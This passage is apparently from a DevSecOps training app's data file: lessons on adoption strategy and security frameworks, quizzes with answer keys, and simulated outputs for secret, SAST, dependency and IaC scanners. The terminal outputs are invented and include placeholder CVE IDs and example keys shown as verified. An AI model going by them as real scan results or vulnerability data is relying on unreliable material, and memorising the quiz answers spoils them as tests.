            { title: 'Supply Chain', color: '#A78BFA', points: ['SBOM for all production images', 'Image signing with Cosign', 'Dependency update automation'] },
            { title: 'Runtime', color: '#22C55E', points: ['Policy-as-Code with OPA/Gatekeeper', 'Runtime monitoring with Falco', 'Full metrics dashboard'] },
          ]},
        ]},
        { heading: 'Key Principles', blocks: [
          { type: 'comparison', items: [
            { title: 'Do This', color: '#22C55E', points: ['Start with LOW friction tools', 'Gradually increase enforcement (warn → soft block → hard block)', 'Show value monthly: "X secrets caught, Y CVEs blocked"', 'Get executive sponsorship early'] },
            { title: 'Avoid This', color: '#EF4444', points: ['Don\'t hard-block on day one — creates enemies', 'Don\'t blame developers — make secure = easy', 'Don\'t try to boil the ocean — incremental wins', 'Don\'t skip metrics — you need proof of ROI'] },
          ]},
        ]},
      ],
    },
    quiz: [
      { q: "What should be the FIRST security tool deployed?", opts: ["DAST scanner", "Pre-commit hooks for secrets detection (lowest friction, highest impact)", "SonarQube", "Runtime monitoring"], answer: 1, explanation: "Pre-commit hooks with Gitleaks take minutes to set up, have zero impact on CI speed, and prevent the most critical issue (leaked secrets). Start here." },
      { q: "Why start with warnings instead of hard blocks?", opts: ["Blocks are too hard to implement", "Starting with warnings lets developers learn and adapt before enforcement creates frustration", "Warnings are more secure", "Management prefers warnings"], answer: 1, explanation: "If you immediately block PRs, developers will see security as an obstacle. Warnings build awareness; hard blocks come after developers understand the value." },
      { q: "What is a Security Champion?", opts: ["The CISO", "A developer who advocates for security within their team, bridging dev and security", "An automated scanning tool", "A security consultant"], answer: 1, explanation: "Security Champions are developers embedded in feature teams who promote security practices, triage findings, and bridge the gap between development and security teams." },
      { q: "How do you get developer buy-in?", opts: ["Mandate security through management", "Make security easy (fast tools, IDE integration), show value (prevented incidents), never blame", "Threaten consequences", "Hire more security engineers"], answer: 1, explanation: "Developers buy in when security is easy (fast, integrated), valuable (visible prevented incidents), and blameless. Mandates without developer empathy fail." },
      { q: "What metrics should you track from the start?", opts: ["Only tool costs", "Scan coverage (% repos scanned), open vulns by severity, MTTR, developer adoption", "Number of security meetings", "Lines of code scanned"], answer: 1, explanation: "Track what matters: how much of your code is scanned (coverage), how bad are the findings (severity), how quickly you fix them (MTTR), and how many teams participate (adoption)." },
    ],
  },
  '5.5': {
    id: '5.5', pathId: 5, title: 'Scenario — Developer Resistance', baseXP: 100, estTime: '5 min',
    hasSim: false, hasExecute: false, hasVerify: false,
    theory: {
      sections: [
        { heading: 'The Scenario', blocks: [
          { type: 'callout', variant: 'warning', title: 'The Pushback', content: 'Developers are resisting security scanning. You\'re hearing: "It slows us down," "Too many false positives," "Security is not my job," "We have deadlines." How do you win them over?' },
        ]},
        { heading: 'Strategy 1: Empathy First', blocks: [
          { type: 'text', content: 'Listen to specific complaints — they\'re often valid. Bad tooling IS a legitimate problem.' },
          { type: 'keyterms', terms: [
            { term: '"Scans are too slow"', definition: 'Measure actual impact. Optimize: parallel execution, incremental scanning, caching. Show before/after metrics.' },
            { term: '"Too many false positives"', definition: 'Tune rules, create allowlists, prioritize by severity, track FP rate. Devs should only see actionable findings.' },
            { term: '"It blocks my deploys"', definition: 'Switch to warnings first, block only on CRITICAL. Gradual enforcement builds trust.' },
            { term: '"Not my job"', definition: 'Make it invisible: IDE plugins give feedback while coding. Pre-commit hooks catch issues before git.' },
          ]},
        ]},
        { heading: 'Strategy 2: Make Security Invisible', blocks: [
          { type: 'severity-bars', title: 'How Fast Are These Scans Really?', items: [
            { rank: '⚡', label: 'Gitleaks pre-commit (secrets)', count: 2, color: '#22C55E' },
            { rank: '⚡', label: 'Hadolint (Dockerfile lint)', count: 1, color: '#22C55E' },
            { rank: '🔍', label: 'Semgrep SAST (code scan)', count: 30, color: '#3B82F6' },
            { rank: '📦', label: 'Trivy SCA (dependencies)', count: 45, color: '#3B82F6' },
            { rank: '🐳', label: 'Trivy image scan', count: 60, color: '#F59E0B' },
            { rank: '🎯', label: 'ZAP DAST (baseline)', count: 120, color: '#F97316' },
          ]},
          { type: 'callout', variant: 'tip', content: 'Secrets detection adds 2 seconds. SAST adds 30 seconds. That\'s less than the time it takes to get coffee. And it\'s infinitely faster than incident response (days to weeks).' },
        ]},
        { heading: 'Strategy 3: Show the Value', blocks: [
          { type: 'severity-bars', title: 'The Cost of NOT Doing DevSecOps', items: [
            { rank: '💰', label: 'Uber breach (2016)', count: 148, color: '#EF4444' },
            { rank: '💰', label: 'Equifax breach (2017)', count: 575, color: '#EF4444' },
            { rank: '💰', label: 'Capital One breach (2019)', count: 80, color: '#F97316' },
            { rank: '💰', label: 'SolarWinds incident (2020)', count: 100, color: '#F97316' },
          ]},
          { type: 'callout', variant: 'key-concept', content: 'Concrete examples from YOUR organization are most compelling. "We caught 12 secrets this month" is good. "That AWS key we caught had admin access to all production databases" is powerful.' },
        ]},
        { heading: 'Strategy 4: Gamification', blocks: [
          { type: 'comparison', items: [
            { title: 'Recognition', color: '#3B82F6', points: ['Security Champion of the Month', 'Fix-rate leaderboards (positive framing)', 'Developers present security wins at all-hands'] },
            { title: 'Engagement', color: '#A78BFA', points: ['CTF competitions with prizes', 'Bug bounty programs (internal)', 'Lunch-and-learns (developers teach developers)'] },
          ]},
        ]},
        { heading: 'Strategy 5: Executive Sponsorship', blocks: [
          { type: 'text', content: 'Executive sponsorship provides mandate, budget, and signals that security is a company priority.' },
          { type: 'steps', steps: [
            { label: 'Frame as risk management, not developer burden', detail: 'Executives understand risk. "A leaked credential costs $X. Prevention costs $Y. Y << X."' },
            { label: 'Leverage compliance requirements', detail: 'SOC2, ISO 27001, PCI-DSS often require these controls. Compliance is non-negotiable.' },
            { label: 'Show incident cost vs prevention cost', detail: 'Security incidents cost 10-100x more than the tools and process to prevent them.' },
          ]},
        ]},
      ],
    },
    quiz: [
      { q: "A developer says 'security scanning is too slow.' What do you do first?", opts: ["Tell them it's mandatory", "Investigate — measure actual scan times, optimize (parallel, cache, incremental), and eliminate genuine bottlenecks", "Remove the scanning", "Escalate to their manager"], answer: 1, explanation: "Their complaint may be valid. Measure the actual impact, then optimize: run scans in parallel, use incremental scanning, cache results. Show the improvement." },
      { q: "How do you reduce false positive fatigue?", opts: ["Ignore all findings", "Tune rules, create allowlists, filter by severity, track FP rate, and use custom rules for your codebase", "Disable low-severity rules", "Tell developers to deal with it"], answer: 1, explanation: "False positives erode trust. Actively tune rules, suppress known FPs, prioritize by severity, and track your FP rate. Developers should only see actionable findings." },
      { q: "What is the most effective way to show DevSecOps value?", opts: ["Show the tool dashboard", "Show specific prevented incidents: 'This AWS key we caught had admin access to all production data'", "Quote industry statistics", "Show the tool costs"], answer: 1, explanation: "Concrete examples from YOUR organization are most compelling. 'We caught 12 secrets this month' is good; 'That one secret had admin access to prod databases' is powerful." },
      { q: "Why are IDE security plugins valuable?", opts: ["They're free", "They give developers instant feedback while coding, before code even reaches the pipeline", "They replace CI scanning", "They're easier to install"], answer: 1, explanation: "IDE plugins shift security feedback to the earliest possible moment — while the developer is actively thinking about the code. No pipeline wait, no context switching." },
      { q: "What role does executive sponsorship play?", opts: ["It's not needed", "It provides mandate, budget, and signals that security is a company priority, not a team preference", "It replaces developer buy-in", "It's only for compliance"], answer: 1, explanation: "Executive sponsorship ensures security has budget, mandate, and organizational priority. But it must complement, not replace, developer buy-in and empathy." },
    ],
  },
  '5.6': {
    id: '5.6', pathId: 5, title: 'Architecture & Frameworks', baseXP: 100, estTime: '5 min',
    hasSim: false, hasExecute: false, hasVerify: false,
    theory: {
      sections: [
        { heading: 'Key Diagrams to Draw in Interviews', blocks: [
          { type: 'text', content: 'Be ready to whiteboard these three diagrams. They demonstrate comprehensive understanding:' },
          { type: 'pipeline', stages: [
            { label: 'Source', icon: '📥', desc: 'git push', security: false },
            { label: 'Secrets', icon: '🔐', desc: 'Gitleaks', security: true, tool: 'Gitleaks' },
            { label: 'Build', icon: '🔨', desc: 'Compile', security: false },
            { label: 'SAST/SCA', icon: '🔍', desc: 'Semgrep+Trivy', security: true, tool: 'Scan' },
            { label: 'Image', icon: '🐳', desc: 'Trivy image', security: true, tool: 'Trivy' },
            { label: 'Stage', icon: '🎭', desc: 'Deploy staging', security: false },
            { label: 'DAST', icon: '🎯', desc: 'ZAP scan', security: true, tool: 'ZAP' },
            { label: 'Gate', icon: '🚦', desc: 'OPA policy', security: true, tool: 'OPA' },
            { label: 'Prod', icon: '🚀', desc: 'Deploy', security: false },
            { label: 'Monitor', icon: '👁', desc: 'Falco+SIEM', security: true, tool: 'Falco' },
          ]},
          { type: 'diagram', variant: 'linear', nodes: [
            { label: 'App', note: 'Requests secret' },
            { label: 'Vault API', note: 'Auth check' },
            { label: 'Policy', note: 'Least privilege' },
            { label: 'Secret', note: 'Short TTL' },
            { label: 'Rotate', note: 'Auto-rotation' },
          ]},
        ]},
        { heading: 'Frameworks Overview', blocks: [
          { type: 'keyterms', terms: [
            { term: 'OWASP Top 10 (2025)', definition: 'The ten most critical web app security risks. A01 Broken Access Control, A02 Crypto Failures, A03 Injection. Updated for supply chain and AI threats.' },
            { term: 'NIST SSDF (SP 800-218)', definition: 'Secure Software Development Framework. Groups: Prepare Organization, Protect Software, Produce Secure Software, Respond to Vulnerabilities.' },
            { term: 'SLSA', definition: 'Supply-chain Levels for Software Artifacts. L0 (none) → L1 (documented) → L2 (signed provenance) → L3 (hardened build). Build integrity framework.' },
            { term: 'CIS Benchmarks', definition: 'Configuration security guidelines for Docker, K8s, AWS, Azure, GCP, Linux. Automated with kube-bench, Docker Bench.' },
            { term: 'MITRE ATT&CK', definition: 'Knowledge base of adversary tactics: Initial Access, Execution, Persistence, Privilege Escalation, Lateral Movement, Exfiltration. Map threats to defenses.' },
          ]},
        ]},
        { heading: 'SLSA Levels Deep Dive', blocks: [
          { type: 'steps', steps: [
            { label: 'SLSA L0 — No guarantees', detail: 'No provenance, no integrity checks. Most projects start here.' },
            { label: 'SLSA L1 — Documented build', detail: 'Build process is documented. You know how the artifact was built.' },
            { label: 'SLSA L2 — Signed provenance', detail: 'Build service generates signed provenance. You can verify who built it and from what source.' },
            { label: 'SLSA L3 — Hardened build', detail: 'Build platform is hardened. Provenance is non-falsifiable. Highest supply chain integrity.' },
          ]},
        ]},
        { heading: 'MITRE ATT&CK — Think Like an Attacker', blocks: [
          { type: 'attack-flow', steps: [
            { type: 'attack', label: 'Initial Access', detail: 'Phishing, exploiting public-facing app, supply chain compromise, valid accounts' },
            { type: 'attack', label: 'Execution + Persistence', detail: 'Run malicious code, install backdoor, create accounts, modify startup scripts' },
            { type: 'attack', label: 'Privilege Escalation', detail: 'Exploit misconfig, container escape, kernel vuln, credential theft' },
            { type: 'attack', label: 'Lateral Movement + Exfiltration', detail: 'Move to other systems, access databases, exfiltrate data to external servers' },
            { type: 'defense', label: 'DevSecOps Defense at Every Stage', detail: 'SAST/SCA prevent initial vulns. Runtime monitoring detects anomalous behavior. NetworkPolicies limit lateral movement. Encryption protects data at rest.' },
          ]},
          { type: 'callout', variant: 'key-concept', content: 'Understanding ATT&CK is what separates a tool operator from a security engineer. You need to know what you\'re defending against to build effective defenses.' },
        ]},
      ],
    },
    quiz: [
      { q: "What framework focuses on software supply chain integrity?", opts: ["OWASP Top 10", "SLSA (Supply-chain Levels for Software Artifacts)", "CIS Benchmarks", "MITRE ATT&CK"], answer: 1, explanation: "SLSA provides a framework for ensuring build integrity and provenance, from L0 (no guarantees) to L3 (hardened build platform with non-falsifiable provenance)." },
      { q: "What is the NIST SSDF?", opts: ["A scanning tool", "A set of recommended practices for secure software development throughout the lifecycle", "A firewall standard", "A programming language"], answer: 1, explanation: "NIST SP 800-218 (SSDF) provides recommended practices organized around preparing the org, protecting software, producing secure software, and responding to vulnerabilities." },
      { q: "What is MITRE ATT&CK used for?", opts: ["Writing code", "Understanding adversary tactics and techniques to design better defenses", "Attacking systems", "Compliance reporting"], answer: 1, explanation: "ATT&CK maps real-world adversary behavior: how attackers gain access, move laterally, escalate privileges, and exfiltrate data. Use it to model threats and validate your defenses." },
      { q: "What should a DevSecOps pipeline diagram include?", opts: ["Just build and deploy", "Every security touchpoint from source code to runtime monitoring", "Only SAST scanning", "Just the deployment stage"], answer: 1, explanation: "A complete diagram shows security at every stage: secrets scan, SAST, SCA, image scan, DAST, policy gates, and runtime monitoring. This demonstrates comprehensive coverage." },
      { q: "Why are CIS Benchmarks valuable?", opts: ["They're required by law", "They provide detailed, actionable configuration guidelines that can be automated with tools like kube-bench", "They replace security scanning", "They're only for cloud providers"], answer: 1, explanation: "CIS Benchmarks translate security principles into specific, testable configuration items. Tools automate checking hundreds of settings against these benchmarks." },
    ],
  },
};

// ============================================================================
// DATA: TERMINAL COMMANDS (56 total)
// ============================================================================
const TERMINAL_COMMANDS = {
  'docker --version': 'Docker version 24.0.7, build afdd53b4e3',
  'docker ps': 'CONTAINER ID   IMAGE                        COMMAND                  CREATED       STATUS       PORTS                    NAMES\nf7a8b9c0d1e2   bkimminich/juice-shop        "docker-entrypoint.s…"   2 hours ago   Up 2 hours   0.0.0.0:3000->3000/tcp   juice-shop\na1b2c3d4e5f6   jenkins/jenkins:lts           "/usr/bin/tini -- /u…"   3 hours ago   Up 3 hours   0.0.0.0:8080->8080/tcp   jenkins',
  'docker ps -a': 'CONTAINER ID   IMAGE                        COMMAND                  CREATED       STATUS                     PORTS                    NAMES\nf7a8b9c0d1e2   bkimminich/juice-shop        "docker-entrypoint.s…"   2 hours ago   Up 2 hours                 0.0.0.0:3000->3000/tcp   juice-shop\na1b2c3d4e5f6   jenkins/jenkins:lts           "/usr/bin/tini -- /u…"   3 hours ago   Up 3 hours                 0.0.0.0:8080->8080/tcp   jenkins\nb2c3d4e5f6a7   sonarqube:community           "/opt/sonarqube/dock…"   5 hours ago   Exited (130) 1 hour ago                             sonarqube\nc3d4e5f6a7b8   hashicorp/vault:latest        "docker-entrypoint.s…"   6 hours ago   Exited (0) 2 hours ago                               vault',
  'docker images': 'REPOSITORY                TAG            IMAGE ID       CREATED        SIZE\nbkimminich/juice-shop     latest         a1b2c3d4e5f6   2 weeks ago    580MB\nnginx                     latest         b2c3d4e5f6a7   3 weeks ago    187MB\npython                    3.12-slim      c3d4e5f6a7b8   3 weeks ago    155MB\nalpine                    latest         d4e5f6a7b8c9   4 weeks ago    7.8MB',
  'docker build -t myapp:v1 .': 'Step 1/6: FROM python:3.12-slim\n ---> c3d4e5f6a7b8\nStep 2/6: WORKDIR /app\n ---> Running in e5f6a7b8c9d0\n ---> f6a7b8c9d0e1\nStep 3/6: COPY requirements.txt .\n ---> a7b8c9d0e1f2\nStep 4/6: RUN pip install --no-cache-dir -r requirements.txt\n ---> Running in b8c9d0e1f2a3\nCollecting flask==3.0.0\nInstalling collected packages: flask\nSuccessfully installed flask-3.0.0\n ---> c9d0e1f2a3b4\nStep 5/6: COPY . .\n ---> d0e1f2a3b4c5\nStep 6/6: CMD ["python3", "app.py"]\n ---> e1f2a3b4c5d6\nSuccessfully built a1b2c3d4e5f6\nSuccessfully tagged myapp:v1',
  'docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop': 'f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8',
  'docker logs juice-shop': 'info: All dependencies in ./package.json are satisfied..\ninfo: Chatbot training data validated.\ninfo: Detected Node.js v20.10.0\ninfo: Detected OS linux (amd64)\ninfo: Configuration default validated.\ninfo: Server listening on port 3000',
  'docker stop juice-shop': 'juice-shop',
  'gitleaks detect -v': 'Finding:     AKIAIOSFODNN7EXAMPLE\nSecret:      AKIAIOSFODNN7EXAMPLE\nRuleID:      aws-access-key-id\nEntropy:     3.52\nFile:        config.py\nLine:        5\nFingerprint: config.py:aws-access-key-id:5\n\nFinding:     ghp_FAKE_EXAMPLE_TOKEN_0000000000\nSecret:      ghp_ABCDE...\nRuleID:      github-pat\nEntropy:     4.12\nFile:        config.py\nLine:        7\nFingerprint: config.py:github-pat:7\n\nFinding:     sk_test_FAKE51ABC...\nSecret:      sk_test_FAKE51...\nRuleID:      stripe-api-key\nEntropy:     5.01\nFile:        .env\nLine:        3\nFingerprint: .env:stripe-api-key:3\n\n3 leaks found in 4 files',
  'gitleaks detect --report-format json --report-path report.json': '3 leaks found.\n\n📝 Report saved to report.json',
  'gitleaks protect --staged -v': '0 leaks found in staged changes ✅',
  'gitleaks version': 'v8.18.2',
  'trufflehog filesystem . --json': '🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷\n\n✅ Found verified result 🐷🔑\nDetector Type: AWS\nDecoder Type: PLAIN\nRaw: AKIAIOSFODNN7EXAMPLE\nFile: config.py\nLine: 5\nVerified: true\n\n✅ Found verified result 🐷🔑\nDetector Type: Stripe\nDecoder Type: PLAIN\nRaw: sk_test_FAKE51ABC...\nFile: .env\nLine: 3\nVerified: true\n\n✅ Found 2 results.',
  'trufflehog git file://. --json': '🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷\n\nScanning git history...\n\n✅ Found verified result 🐷🔑\nDetector Type: AWS\nRaw: AKIAIOSFODNN7EXAMPLE\nFile: config.py (current)\n\n✅ Found verified result 🐷🔑\nDetector Type: Stripe\nRaw: sk_test_FAKE51ABC...\nFile: .env (current)\n\n✅ Found result 🐷🔑\nDetector Type: AWS\nRaw: AKIAEXAMPLE12345678\nCommit: a1b2c3d (3 commits ago)\nFile: old-config.py (deleted)\nVerified: false\n\n✅ Found 3 results (1 from git history).',
  'trufflehog --version': '3.63.7',
  'semgrep scan --config auto': 'Scanning 15 files (only those matching rules) with 487 rules...\n\n  vulnerable_app.py\n    security.dangerous-os-system            L8    os.system(cmd)                      ERROR\n    security.dangerous-subprocess-shell      L14   subprocess.call(cmd, shell=True)    WARNING\n    security.sql-injection                   L21   conn.execute(f"SELECT * FROM...")   ERROR\n    security.dangerous-eval                  L31   eval(code)                          ERROR\n    security.path-traversal                  L38   open(user_path)                     WARNING\n\n  config.py\n    security.hardcoded-secret                L5    AWS_KEY = "AKIA..."                 WARNING\n    security.hardcoded-secret                L7    GITHUB_TOKEN = "ghp_..."             WARNING\n\n  app.js\n    security.hardcoded-api-token             L12   apiToken = "sk-..."                  WARNING\n\nFindings: 8 total (3 ERROR, 4 WARNING, 1 INFO)',
  'semgrep scan --config "p/security-audit"': 'Running \'security-audit\' ruleset (312 rules)...\n\n  vulnerable_app.py\n    audit.dangerous-os-system            L8    os.system(cmd)                      ERROR\n    audit.subprocess-shell-true          L14   subprocess.call(cmd, shell=True)    ERROR\n    audit.sql-injection-fstring          L21   f-string in SQL query               ERROR\n    audit.dangerous-eval                 L31   eval(code)                          ERROR\n    audit.path-traversal-open            L38   open(user_path)                     ERROR\n    audit.no-input-validation            L8    No input validation before use      WARNING\n\n  config.py\n    audit.hardcoded-credential           L5    Hardcoded AWS key                   WARNING\n    audit.hardcoded-credential           L7    Hardcoded GitHub token              WARNING\n    audit.hardcoded-credential           L9    Hardcoded DB password               WARNING\n\n  app.js\n    audit.hardcoded-api-token            L12   Hardcoded API token                 WARNING\n    audit.missing-csrf-protection        L25   POST handler without CSRF           WARNING\n    audit.missing-rate-limiting          L30   No rate limiting on endpoint         INFO\n\nFindings: 12 total (5 ERROR, 6 WARNING, 1 INFO)',
  'semgrep scan --config "p/owasp-top-ten"': 'Running \'owasp-top-ten\' ruleset (89 rules)...\n\n  A03:Injection\n    vulnerable_app.py:8    os.system(cmd)                      ERROR\n    vulnerable_app.py:21   f-string in SQL query               ERROR\n    vulnerable_app.py:31   eval(code)                          ERROR\n\n  A07:Identification and Authentication Failures\n    config.py:5            Hardcoded credential                WARNING\n\n  A05:Security Misconfiguration\n    app.js:25              Missing CSRF protection             WARNING\n\nFindings: 5 total (3 ERROR, 2 WARNING)',
  'semgrep scan --config auto --json -o report.json': 'Scanning 15 files with 487 rules...\n\nFindings: 8 total (3 ERROR, 4 WARNING, 1 INFO)\n📝 Results saved to report.json',
  'semgrep scan --config auto --sarif -o report.sarif': 'Scanning 15 files with 487 rules...\n\nFindings: 8 total (3 ERROR, 4 WARNING, 1 INFO)\n📝 SARIF report saved to report.sarif',
  'semgrep scan --config custom-rules.yaml target.py': 'Running 3 custom rules...\n\n  target.py\n    custom.dangerous-os-system    L8    os.system() is vulnerable to command injection    ERROR\n    custom.sql-injection          L21   f-string in SQL query is vulnerable to SQLi        ERROR\n\nFindings: 2 from custom rules',
  'trivy fs . --scanners vuln': 'Scanning filesystem...\n\npackage-lock.json (npm)\n=====================\nTotal: 23 (LOW: 5, MEDIUM: 7, HIGH: 8, CRITICAL: 3)\n\n┌──────────────────┬────────────────┬──────────┬───────────┬─────────────┐\n│     Library      │ Vulnerability  │ Severity │ Installed │   Fixed     │\n├──────────────────┼────────────────┼──────────┼───────────┼─────────────┤\n│ express          │ CVE-2024-1234  │ CRITICAL │ 4.17.1    │ 4.18.2      │\n│ lodash           │ CVE-2021-23337 │ HIGH     │ 4.17.15   │ 4.17.21     │\n│ axios            │ CVE-2023-4567  │ HIGH     │ 0.21.1    │ 1.6.0       │\n└──────────────────┴────────────────┴──────────┴───────────┴─────────────┘\n\nrequirements.txt (pip)\n======================\nTotal: 4 (MEDIUM: 2, HIGH: 2)',
  'trivy fs . --scanners vuln --severity HIGH,CRITICAL': 'Scanning filesystem...\n\nTotal: 13 (HIGH: 10, CRITICAL: 3)\n\n┌──────────────────┬────────────────┬──────────┬───────────┬─────────────┐\n│     Library      │ Vulnerability  │ Severity │ Installed │   Fixed     │\n├──────────────────┼────────────────┼──────────┼───────────┼─────────────┤\n│ express          │ CVE-2024-1234  │ CRITICAL │ 4.17.1    │ 4.18.2      │\n│ jsonwebtoken     │ CVE-2023-8901  │ CRITICAL │ 8.5.1     │ 9.0.0       │\n│ minimatch        │ CVE-2023-7890  │ CRITICAL │ 3.0.4     │ 3.1.2       │\n└──────────────────┴────────────────┴──────────┴───────────┴─────────────┘',
  'trivy image nginx:latest': 'nginx:latest (debian 12.5)\n==========================\nOS Packages:     34 (LOW: 8, MEDIUM: 14, HIGH: 9, CRITICAL: 3)\nApp Libraries:   11 (LOW: 2, MEDIUM: 5, HIGH: 3, CRITICAL: 1)\n\nTotal: 45 vulnerabilities\n\n┌──────────────┬────────────────┬──────────┬───────────┬─────────────┐\n│   Package    │ Vulnerability  │ Severity │ Installed │   Fixed     │\n├──────────────┼────────────────┼──────────┼───────────┼─────────────┤\n│ openssl      │ CVE-2024-0727  │ CRITICAL │ 3.0.11    │ 3.0.13      │\n│ nghttp2      │ CVE-2023-44487 │ CRITICAL │ 1.57.0    │ 1.58.0      │\n│ curl         │ CVE-2023-46218 │ HIGH     │ 8.4.0     │ 8.5.0       │\n│ zlib         │ CVE-2023-45853 │ HIGH     │ 1.2.13    │ 1.3.0       │\n└──────────────┴────────────────┴──────────┴───────────┴─────────────┘',
  'trivy image --severity CRITICAL nginx:latest': 'nginx:latest (debian 12.5)\n==========================\nTotal: 4 (CRITICAL: 4)\n\n┌──────────────┬────────────────┬──────────┬───────────┬─────────────┐\n│   Package    │ Vulnerability  │ Severity │ Installed │   Fixed     │\n├──────────────┼────────────────┼──────────┼───────────┼─────────────┤\n│ openssl      │ CVE-2024-0727  │ CRITICAL │ 3.0.11    │ 3.0.13      │\n│ nghttp2      │ CVE-2023-44487 │ CRITICAL │ 1.57.0    │ 1.58.0      │\n│ libxml2      │ CVE-2024-2345  │ CRITICAL │ 2.9.14    │ 2.12.0      │\n│ expat        │ CVE-2024-3456  │ CRITICAL │ 2.5.0     │ 2.6.0       │\n└──────────────┴────────────────┴──────────┴───────────┴─────────────┘',
  'trivy image --vuln-type os nginx:latest': 'nginx:latest (debian 12.5)\n==========================\nOS Packages: 34 vulnerabilities (LOW: 8, MEDIUM: 14, HIGH: 9, CRITICAL: 3)',
  'trivy image --vuln-type library nginx:latest': 'nginx:latest (debian 12.5)\n==========================\nApp Libraries: 11 vulnerabilities (LOW: 2, MEDIUM: 5, HIGH: 3, CRITICAL: 1)',
  'trivy config Dockerfile': 'Dockerfile (dockerfile)\n=======================\nTests: 23, Failures: 3, Warnings: 2\n\nFAIL  HIGH    Specify a tag in the \'FROM\' statement (DS001)\n  Dockerfile:1  FROM ubuntu:latest\n\nFAIL  HIGH    Last USER command should not be root (DS002)\n  Dockerfile:8  (no USER instruction found)\n\nFAIL  MEDIUM  Add HEALTHCHECK instruction (DS026)\n  Dockerfile    (no HEALTHCHECK found)\n\nWARN  LOW     Pin versions in apt-get install (DS003)\n  Dockerfile:3  RUN apt-get install -y curl wget\n\nWARN  LOW     Use COPY instead of ADD (DS005)\n  Dockerfile:5  ADD . /app',
  'trivy fs . --format cyclonedx -o sbom.json': 'Generating SBOM in CycloneDX format...\nDetected OS packages: 42\nDetected application libraries: 105\n\n📝 SBOM saved to sbom.json (147 components)',
  'grype nginx:latest': 'NAME          INSTALLED   FIXED-IN   TYPE   VULNERABILITY    SEVERITY\nopenssl       3.0.11      3.0.13     deb    CVE-2024-0727    High\nlibcrypto3    3.0.11      3.0.13     deb    CVE-2024-0727    High\ncurl          8.4.0       8.5.0      deb    CVE-2023-46218   Medium\nzlib          1.2.13      1.3.0      deb    CVE-2023-45853   High\nnghttp2       1.57.0      1.58.0     deb    CVE-2023-44487   Critical\nexpat         2.5.0       2.6.0      deb    CVE-2024-3456    High\nlibxml2       2.9.14      2.12.0     deb    CVE-2024-2345    Critical\npcre2         10.42       10.43      deb    CVE-2024-5678    Medium\n... (33 more)\n\n41 vulnerabilities found',
  'grype . --only-fixed': 'Showing only vulnerabilities with available fixes:\n\n12 fixable vulnerabilities found\n\nNAME          INSTALLED   FIXED-IN   VULNERABILITY    SEVERITY\nexpress       4.17.1      4.18.2     CVE-2024-1234    Critical\nlodash        4.17.15     4.17.21    CVE-2021-23337   High\naxios         0.21.1      1.6.0      CVE-2023-4567    High\n... (9 more)',
  'grype . -o json > report.json': '📝 Results saved to report.json',
  'hadolint Dockerfile': 'Dockerfile:1 DL3007 warning: Using latest is prone to errors if the image will ever update. Pin the version explicitly\nDockerfile:3 DL3008 warning: Pin versions in apt-get install. Instead of `apt-get install <package>` use `apt-get install <package>=<version>`\nDockerfile:3 DL3009 info: Delete the apt-get lists after installing something\nDockerfile:5 DL3002 error: Last USER should not be root\nDockerfile:6 SC2086 info: Double quote to prevent globbing and word splitting\nDockerfile:7 DL3025 warning: Use arguments JSON notation for CMD and ENTRYPOINT arguments',
  'hadolint --format json Dockerfile': '[{"line":1,"code":"DL3007","message":"Using latest is prone to errors","level":"warning","file":"Dockerfile"},{"line":3,"code":"DL3008","message":"Pin versions in apt-get install","level":"warning","file":"Dockerfile"},{"line":5,"code":"DL3002","message":"Last USER should not be root","level":"error","file":"Dockerfile"},{"line":7,"code":"DL3025","message":"Use arguments JSON notation for CMD","level":"warning","file":"Dockerfile"}]',
  'hadolint --config .hadolint.yaml Dockerfile': 'Using config from .hadolint.yaml\n\nDockerfile:5 DL3002 error: Last USER should not be root\nDockerfile:3 DL3008 warning: Pin versions in apt-get install\n\n1 error(s), 1 warning(s) (2 rules ignored by config)',
  'checkov -d .': 'Passed checks: 12, Failed checks: 8, Skipped checks: 0\n\nCheck: CKV_AWS_18: "Ensure the S3 bucket has access logging enabled"\n  FAILED for resource: aws_s3_bucket.data\n  File: /main.tf:1-6\n  Guide: https://docs.prismacloud.io/en/enterprise-edition/policy-reference/aws-policies/s3-policies\n\nCheck: CKV_AWS_24: "Ensure no security groups allow ingress from 0.0.0.0:0 to port 22"\n  FAILED for resource: aws_security_group.wide_open\n  File: /main.tf:8-22\n\nCheck: CKV_AWS_145: "Ensure RDS instance is encrypted at rest"\n  FAILED for resource: aws_db_instance.default\n  File: /main.tf:24-35\n\nCheck: CKV_AWS_157: "Ensure that RDS instances have Multi-AZ enabled"\n  FAILED for resource: aws_db_instance.default\n  File: /main.tf:24-35',
  'checkov -d terraform/': 'Scanning Terraform files in terraform/...\n\nPassed: 5, Failed: 12, Skipped: 0\n\nFailed checks:\n  CKV_AWS_18  S3 bucket logging          FAILED  /terraform/s3.tf:1-8\n  CKV_AWS_19  S3 bucket encryption        FAILED  /terraform/s3.tf:1-8\n  CKV_AWS_21  S3 bucket versioning        FAILED  /terraform/s3.tf:1-8\n  CKV_AWS_24  Security group 0.0.0.0      FAILED  /terraform/sg.tf:1-15\n  CKV_AWS_79  IMDSv2 not required         FAILED  /terraform/ec2.tf:1-12\n  ... (7 more)',
  'checkov -f k8s.yaml': 'Check: CKV_K8S_1: "Do not allow containers to run as privileged"\n  FAILED for resource: Deployment.default.vulnerable-app\n  File: k8s.yaml:1-20\n\nCheck: CKV_K8S_6: "Do not allow containers to run with root"\n  FAILED for resource: Deployment.default.vulnerable-app\n  File: k8s.yaml:1-20\n\nCheck: CKV_K8S_12: "Memory limits should be set"\n  FAILED for resource: Deployment.default.vulnerable-app\n  File: k8s.yaml:1-20\n\nCheck: CKV_K8S_13: "CPU limits should be set"\n  FAILED for resource: Deployment.default.vulnerable-app\n  File: k8s.yaml:1-20\n\nCheck: CKV_K8S_14: "Image Tag should be fixed"\n  FAILED for resource: Deployment.default.vulnerable-app\n  File: k8s.yaml:1-20\n\nPassed: 3, Failed: 5',
  'checkov -f k8s.yaml --framework kubernetes': 'Framework: kubernetes\n\nCheck: CKV_K8S_1: "Do not allow containers to run as privileged"\n  FAILED\nCheck: CKV_K8S_6: "Do not allow containers to run with root"\n  FAILED\nCheck: CKV_K8S_12: "Memory limits should be set"\n  FAILED\nCheck: CKV_K8S_13: "CPU limits should be set"\n  FAILED\nCheck: CKV_K8S_14: "Image Tag should be fixed"\n  FAILED\n\nPassed: 3, Failed: 5',
